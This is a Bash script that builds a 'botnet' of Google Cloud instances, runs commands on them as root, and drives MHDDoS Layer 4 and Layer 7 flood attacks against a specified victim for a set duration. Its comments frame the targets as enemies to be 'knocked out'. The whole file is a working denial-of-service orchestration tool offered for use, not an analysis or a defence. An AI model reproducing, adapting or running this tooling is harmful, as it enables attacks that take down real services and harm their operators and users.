#!/bin/bash

usage()
{
	local w=25
	local fmt="\t%-${w}s %s\n"
	printf "Usage: $0 [options...]\n"
	printf "$fmt" "-a, --all" "Run action on each bot in the botnet."
	printf "$fmt" "-n, --num <num>" "Run action on num random bots."
	printf "$fmt" "-b, --bot <botname>" "Run action on specified bot."
	printf "$fmt" "-B, --botnet <botnet>" "Specify botnet to act on."
	printf "$fmt" "-d, --delete" "Delete specified bots."
	printf "$fmt" "-c, --create" "Create some bots."
	printf "$fmt" "-r, -C, --command <cmd>" "Command to run on each bot."
	printf "$fmt" "--attack <Layer:attack>" "Run this MHDDoS attack on bots"
	printf "$fmt" "--victim <victim_spec>" "Victim specification, like in MHDDoS."
	printf "$fmt" "--time <seconds>" "Attack time frame length in seconds."
	printf "$fmt" "-l, --list" "List bots in selected botnet."
	printf "$fmt" "--async" "Launch things asynchronously."
	printf "$fmt" "-t,--no-tty" "Don't allocate pty device"
	printf "$fmt" "-u, --user <user>" "Run command on bot under the user."
	printf "$fmt" "-S, --ssh-key-file <file>" "Connect to bot with this ssh key file."
	printf "$fmt" "-z, --zone <zone>" "(With -c only) Create bots in this zone"
	printf "$fmt" "-Z, --zone-file <file>" "(With -c only) Create bots in zones, specified in the file."
	printf "\n"
	printf "$fmt" "-v, --verbose" "Make output more verbose."
	printf "$fmt" "-q, --quiet" "Be more quiet."
}

# TODO: should be really used anywhere, since user-passed commands are not
# quoted properly
token_quote()
{
  local quoted=()
  for token; do
    quoted+=( "$(printf '%q' "$token")" )
  done
  printf '%s\n' "${quoted[*]}"
}

# die and exit immidiately
die()
{
	printf "$@"
	exit 1
}

# print message if log level is not quiet
msg()
{
	[ "$VERB" -ne 0 ] && printf "$@" || (exit 1)
}

# print debug message if debug log level is enabled
debug()
{
	printf "[DEBUG] " >&2
	printf "$@" >&2
}

# print warning if debug log level is enabled
warn()
{
	printf "[WARNING] " >&2
	printf "$@" >&2
}

# launches a completely detached process, which
# won't die even after parent(shell) termination
noterm()
{
    nohup "$@"  </dev/null &>/dev/null &
    disown %nohup
}

# generate random string of lowercase and digits
# length is passed as the first argument
rand_str()
{
	local length=${1:?"No length specified in call to rand_str()"}
	tr -dc "a-z0-9" </dev/urandom | head -c "$length"
}

# returns random google cloud zone, so that bots can be spreaded around the world
# at the time of their creation
rand_zone()
{
	[ -n "$ZONE_FILE" -a -s "$ZONE_FILE" ] ||
		gcloud compute zones list --format='value(name)' > "$ZONE_FILE"
	shuf -n1 < "$ZONE_FILE"
}

# TODO: this function should initialize or, at least, guide the user through
# google api configuration, so that the rest of the script z
init()
{
	:
}


# Returns the Google Cloud zone where the bot is located
#
# Arg 1: bot name
get_bot_zone()
{
	: "${1:?No bot specified in call to get_bot_zone}"
	gcloud compute instances list --format="value(name,zone)" |
		grep -m1 -F "$1" |
		awk '{print $2}'
}

# Returns all of the bots that are pertained to a named botnet.
#
# Arg 1: botnet name
get_botnet_hosts()
{
	: "${1:?No botnet specified in call to get_botnet_hosts}"
		# get list of botnet hosts
	gcloud compute instances list --format="value(name)" -q 2>/dev/null |
		grep -e "-$1-"
}

# As its names suggests, this function will create a bot in the Google Cloud.
# For this task, it will use a precreated template named "bot", which by default specifies
# a short-term cheap bot, that are not very expansive to create in big amounts.
# TODO: add template creation code into the init function
create_bot()
{
	local botname
	local botid
	local zone

	# If user didn't specify a name for a botnet, pick it randomly and tell
	# it to the user later.
	: "${BOTNET_ID:=$(rand_str 3)}"
	for ((i=1; i<=NUM_BOTS; i++)); do
		debug "Creating bot #$i\n"
		# If user didn't specify a name for a bot, pick it randomly
		[ -n "$BOT" -a "$NUM_BOTS" == 1 ] && botid="$BOT" || botid=$(rand_str 4)
		# Final bot name consists of a fixed string "bot", a botnet name and a bot name,
		# concatenated with dashes.
		botname="bot-$BOTNET_ID-$botid"
		# Try to create several times in different zones, since
		# failures in the creation process can occur.
		# For example, in most cases, fails are happening because
		# picked zone doesn't have resources to create a bot, based on the template.
		for ((tries=0; tries<10; tries++)); do
			[ -n "$ZONE" ] && zone="$ZONE" || zone="$(rand_zone)"
			gcloud compute instances create "$botname" \
		 		   --source-instance-template bot --zone "$zone" \
				   --quiet &>/dev/null && break
		done || die "Can't create bot for some reason(Probably bad zone or limit exceeded)\n"

		# We're also trying several times to transfer bot initialization script,
		# because problems sometimes happened because of bots not starting
		# instantly.
		for ((tries=0; tries<5; tries++)); do
			sleep 1
			gcloud compute scp --zone "$zone" -q \
				   $SSH_KEY_FILE \
				   ./bot_init.sh "$botname":$HOME &>/dev/null && break
		done ||
			{
				# half-initialized bot isn't needed anymore
				remove_bot_impl "$botname"
				die "Can't transfer bot init script to bot\n"
			}

		debug "Running command on bot $botname in zone $zone...\n"
		# And now we run initialization script on a bot.
		if [ -n "$ASYNC" ]; then
			noterm gcloud compute ssh -q --zone "$zone" $SSH_KEY_FILE --command "${COMMAND:-./bot_init.sh}" "$USR"@"$botname" -- $TTY
		else
			gcloud compute ssh -q --zone "$zone" $SSH_KEY_FILE --command "${COMMAND:-./bot_init.sh}" "$USR"@"$botname" -- $TTY >/dev/null
		fi

	done
	
}

# Run action(like create or remove) on the bot or botnet specified
# on the command line.
#
# Arg 1: action as a builtin, function or external command
action_on_bot()
{
	local action="${1:?No action supplied in action_on_bot}"
	if [ "$NUM_BOTS" == all ]; then
		[ -z "$BOTNET_ID" ] && die "No botnet specified, so can't act on it\n"
		for bot in $(get_botnet_hosts "$BOTNET_ID"); do
			$action "$bot" "$@"
		done
	elif [ -n "$NUM_BOTS" -a -z "$BOT" ]; then
		[ -z "$BOTNET_ID" ] && die "No botnet specified, so can't act on it\n"
		for bot in $(get_botnet_hosts "$BOTNET_ID" | shuf -n "$NUM_BOTS"); do
			$action $bot "$@"
		done
	else
		[ -z "$BOT" ] && die "No bot specified, so can't act on it\n"
		$action "$BOT" "$@"
	fi
}

# Implementation of the function that removes a bot from the Google Cloud.
#
# Arg 1: bot name
remove_bot_impl()
{
	: "${1:?No bot is specified in call to remove_bot_impl}"
	zone="$(get_bot_zone "$1")"
	debug "Removing bot $1 in zone $zone...\n"
	if [ -n "$ASYNC" ]; then
		noterm sh -c "yes | gcloud compute instances delete --zone '$zone' '$1'" 2>/dev/null
	else
		yes | gcloud compute instances delete --zone "$zone" "$1" -q &>/dev/null
	fi
}

# Wrapper around the function remove_bot_impl
delete_bot()
{
	action_on_bot "remove_bot_impl"
}

# Implementation of the function that runs some command on a bot.
#
# Arg 1: bot name
# Arg 2: command line to run on the remote. TODO: fix bad quoting
run_bot_impl()
{
	: "${1:?No bot is specified in call to run_bot_impl}"
	: "${2:?No command is specified to run on bot}"
	zone="$(get_bot_zone "$1")"
	debug "Running command on bot $1 in zone $zone...\n"
	if [ -n "$ASYNC" ]; then
		gcloud compute ssh -q --zone "$zone" $SSH_KEY_FILE --command "bash -lic 'noterm sh -c \"$2\"'" "$USR"@"$1" -- $TTY
	else
		gcloud compute ssh -q --zone "$zone" $SSH_KEY_FILE --command "bash -lic '$2'" "$USR"@"$1" -- $TTY
	fi
}

# Wrapper around the function run_bot_impl
run_bot()
{
	[ "$VERB" -eq 0 ] && exec >/dev/null 2>&1
	action_on_bot "run_bot_impl" "$COMMAND"
}

# Implementation of the function that lists a bot.
# Normally function shows bot's name and its associated zone.
# If instead running quitely, show just a name.
#
# Arg 1: bot name
list_bot_impl()
{
	local w=15
	zone="$(get_bot_zone "$1")"
	msg "%-${w}s : %s\n" "$1" "$zone" ||
		printf "%s\n" "$1"
}

# Wrapper around list_bot_impl
list_bot()
{
	[ -n "$BOTNET_ID" -a "$VERB" -ne 0 ] &&
		msg "Listing hosts of botnet $BOTNET_ID...\n"
	action_on_bot "list_bot_impl"
}

# Wrapper around MHDDoS script. See github page for usage instructions.
attack_bot()
{
	[ -z "$ATTACK_ID" -o -z "$ATTACK_LAYER" ] && die "Bad attack specification.\n"
	[ -z "$ATTACK_VICTIM" -a "$ATTACK_LAYER" != stop ] && die "No victim is specified."
	debug "ATTACK_ID      = $ATTACK_ID\n"
	debug "ATTACK_LAYER   = $ATTACK_LAYER\n"
	debug "ATTACK_THREADS = $ATTACK_THREADS\n"
	debug "ATTACK_VICTIM  = $ATTACK_VICTIM\n"
	local script_path="/root/.local/bin/MHDDoS"

	case "$ATTACK_LAYER" in
		(stop) action_on_bot "run_bot_impl" "pkill python3"
			   ;;
		(L7) action_on_bot "run_bot_impl" \
						   "$script_path $ATTACK_ID $ATTACK_VICTIM 0 $ATTACK_THREADS /dev/null 100 $ATTACK_TIME"
			 ;;
		(L4) action_on_bot "run_bot_impl" \
						   "$script_path $ATTACK_ID $ATTACK_VICTIM $ATTACK_THREADS $ATTACK_TIME"
			 ;;
		# TODO: multilayer attack with one command invocation
		(multi) die "Unimplemented attack layer $ATTACK_LAYER\n"
				;;
		(*) die "Unrecognized attack layer '$ATTACK_LAYER'\n"
			;;
	esac
}

# Not really used now
SSH_KEY_FILE=
# What do a user wants to do(create, destroy, attack, or run arbitrary command)?
ACTION=
# Attack named as specified by MHDDoS script
ATTACK_ID=
# Attack layer, currently L4 or L7. No proxies will be used.
ATTACK_LAYER=
# How many threads to create on each bot for an attack?
ATTACK_THREADS=60
# Who is our enemy and is worth to be knocked out?
ATTACK_VICTIM=
# How long the attack is going to last for?
ATTACK_TIME=3600
# How many bots are going to be doing an ACTION
NUM_BOTS=
# Specific bot on which to do an ACTION
BOT=
# Botnet name, in which to do an ACTION
BOTNET_ID=
# How noisy is the output?
VERB=1
# I can also run a random shell command on bots...
COMMAND=
# Very recommended, making an attack or bot creation practical by not waiting so
# long for an ACTION to finish on one bot, before continuing to another.
ASYNC=
# Zone in which to create bots
ZONE=
# As above, but zones are specified in a file
ZONE_FILE="zones.txt"
# SSH as this user
USR="$USER"
# Allocate pty by default, why not? 
TTY=-t
while [ "$#" -gt 0 ]; do
	case "$1" in
		(-a|--all) NUM_BOTS=all
				   ;;
		(-n|--num) shift
				   NUM_BOTS="$1"
				   ;;
		(-d|--delete|--remove) ACTION=delete
							   ;;
		(-c|--create) ACTION=create
					  ;;
		(-b|--bot) shift
				   BOT="$1"
				   ;;
		(-r|-C|--command) shift
						  COMMAND="$1"
						  [ -z "$ACTION" ] && ACTION=run
						  USR=root
						  ;;
		(-l|--list) ACTION=list
					;;
		(-u|--user) shift
					USR="$1"
					;;
		(-S|--ssh-key-file) shift
							SSH_KEY_FILE="--ssh-key-file \"$1\""
							;;
		(--attack) shift
				   ACTION=attack
				   ATTACK_LAYER="${1%:*}"
				   ATTACK_ID="${1#*:}"
				   USR=root
				   ;;
		(-V|--victim) shift
					  ATTACK_VICTIM="$1"
					  ;;
		(--time) shift
				 ATTACK_TIME="$1"
				 ;;
		(-t|--no-tty) TTY=""
				   ;;
		(-T|--threads) shift
					   ATTACK_THREADS="$1"
					   ;;
		(-v|--verbose) VERB=2
					   ;;
		(-q|--quiet) VERB=0
					 ;;
		(-B|--botnet-id|--botnet) shift
		                          BOTNET_ID="$1"
								  ;;
		(-h|--help) usage
					exit 0
					;;
		(--async) ASYNC='&'
				  ;;
		(-z|--zone) shift
					ZONE="$1"
					;;
		(-Z|--zone-file) shift
						 ZONE_FILE="$1"
						 ;;
		(--) break
			 ;;
		(*) usage
			exit 1
			;;
	esac
	shift
done

# Very basic verbosity control implementation...
case "$VERB" in
	# (0) exec &>/dev/null
	# 	;;
	(1) exec 2>/dev/null
		;;
esac

# sanity check
[ -z "$NUM_BOTS" -a -z "$BOT" ] && die "No bots specified\n"

# some preparations
init # implement me ;)

# And now we dispatch user selected action to an appropriate function.
if [ "$ACTION" == create ]; then
	msg "Starting to create a botnet...\n"
	create_bot
	msg "Botnet created!\n"
	msg "Use botnet id '$BOTNET_ID' later\n" 
elif [ "$ACTION" == delete ]; then
	msg "It's over... Destroying botnet!\n"
	delete_bot
	msg "Botnet is successfully destroyed.\n"
elif [ "$ACTION" == run ]; then
	run_bot
elif [ "$ACTION" == list ]; then
	list_bot
elif [ "$ACTION" == attack ]; then
	msg "Good time to DDoS someone, sir.\n"
	attack_bot
else
	die "Unrecognized action $ACTION\n"
fi

# exit gracefully
exit 0
